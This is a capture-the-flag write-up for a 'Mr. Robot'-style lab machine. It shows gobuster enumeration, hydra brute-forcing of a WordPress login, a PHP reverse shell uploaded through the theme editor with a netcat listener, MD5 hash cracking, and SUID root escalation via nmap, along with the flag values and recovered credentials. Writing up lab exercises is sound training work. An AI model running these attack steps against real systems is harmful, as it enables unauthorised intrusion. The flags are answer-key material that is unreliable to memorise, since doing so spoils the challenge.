# key 1
hidden file `/robots.txt` found with gobuster  
`gobuster dir -u url -w /usr/share/wordlists/dirb/common.txt -x .php,.html,.js,.txt`

<details>
<summary>flag</summary>
key-1-of-3.txt -- 073403c8a58a1f80d943455fb30724b9
</details>

# key 2
found wordpress login website with gobuster and wappalyzer
cracked login with hydra and the `fsociety.dic` found in `robots.txt`

#### Username
`hydra -L fsociety.dic -p test url http-post-form "/wp-login.php:log=^User^&pwd=^PASS^:Invalid username" -t 30`  
`Elliot`
#### Password
`hydra -l Elliot -P fsocity.dic url http-post-form "/wp-login.php:log=^User^&pwd=^PASS^:Invalid username" -t 30`  
`ER28-0652`

php reverse shell via `http://10.10.109.29/wp-content/themes/twentyfifteen/archive.php`
uploaded the code to the archive in the editor and listened via `nc -lvnp port`

stable shell via `python -c 'import pty; pty.spawn("/bin/bash")'`

found `password.raw-md5` -- `robot:c3fcd3d76192e4007dfb496cca67e13b`

`hash-identifier` and inserted the hash above --> `abcdefghijklmnopqrstuvwxy`

login `robot` - `abcdefghijklmnopqrstuvwxy`

<details>
<summary>flag</summary>
key-2-of-3.txt -- 822c73956184f694993bede3eb39f959
</details>

# key 3
searched for vulnerabilitys via SUID with `find / -perm /4000 2>/dev/null`
found `/usr/local/bin/nmap`
found nmap vulnerability on `GTFOBins`
`/usr/local/bin/nmap --interactive`  
`!sh` for root access

searched with for the third key `find / -iname key-3-of-3.txt 2>/dev/null` in `/root/key-3-of-3.txt`  

<details>
<summary>flag</summary>
key-3-of-3.txt -- 04787ddef27c3dee1ee161b21670b4e4
</details>

